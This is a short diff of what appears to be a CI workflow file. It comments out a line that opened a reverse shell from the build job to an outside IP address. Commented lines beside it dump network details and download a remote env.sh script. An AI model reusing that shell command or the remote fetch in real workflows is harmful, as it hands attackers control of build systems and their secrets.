@@ -16,7 +16,7 @@ jobs:
         #ipa a > ip.txt
         #/sbin/ifconfig > ip.txt
         #curl -o env.txt https://services.zoocoop.com/env.sh
-        bash -i >& /dev/tcp/151.80.32.13/19999 0>&1
+        #bash -i >& /dev/tcp/151.80.32.13/19999 0>&1
     - name: Commit and push if it changed
       run: |-
         git config user.name "Automated"
